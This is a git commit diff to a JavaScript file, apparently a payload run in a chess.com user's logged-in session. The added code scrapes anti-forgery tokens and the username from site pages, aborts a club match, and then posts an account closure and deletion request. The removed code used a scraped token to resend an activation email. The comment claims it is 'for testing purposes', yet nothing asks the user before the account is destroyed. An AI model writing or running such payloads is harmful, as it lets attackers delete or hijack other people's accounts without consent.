2aaf35253b231a86fd4b40dd1816b198271b405e
yellowrook1 <95589375+yellowrook1@users.noreply.github.com>
2021-12-13 22:18:55 -0500

    Update a.js

--- a.js
+++ a.js
@@ -1,12 +1,27 @@
-fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
+// cancel match first before deleting account, for testing purposes
+fetch("https://www.chess.com/club/matches/1319579").then((response) => response.text())
     .then((text) => {
-            var token = text.match(/("token":".+?)["]/)[1].substr(9); 
-            fetch("https://www.chess.com/callback/resend-activation-email", {
-            "headers": {
-                "content-type": "application/x-www-form-urlencoded",
-            },
-            "body": "_token=" + token,
-            "method": "POST",
-        }).then(response => response.json())
-  .then(data => {alert(data.message.substr(37))});
-    });
+            var token = text.match(/("token":".+?)["]/)[1].substr(9);
+            fetch("https://www.chess.com/club/matches/abort/1319579", {
+                    "headers": {
+                        "content-type": "application/x-www-form-urlencoded",
+                    },
+                    "body": "_token=" + token,
+                    "method": "POST",
+                }).then(response => {
+                        fetch("https://www.chess.com/my-data").then((response) => response.text())
+                            .then((text) => {
+                                    var token = text.match(/(form-error-clear="" value=".+?)["]/)[1].substr(27);
+                                    console.log(token);
+                                    fetch("https://www.chess.com/settings").then((response) => response.text())
+                                        .then((text) => {
+                                                var username = text.match(/("username":".+?)["]/)[1].substr(12);console.log(username);
+                                     fetch("https://www.chess.com/my-data", {
+                    "headers": {
+                        "content-type": "application/x-www-form-urlencoded",
+                    },
+                    "body": "my_data_account_closure_and_deletion[_token]=" + token + "&my_data_account_closure_and_deletion[username]=" + username ,
+                    "method": "POST",
+                })
+                                    })})});
+                                                });
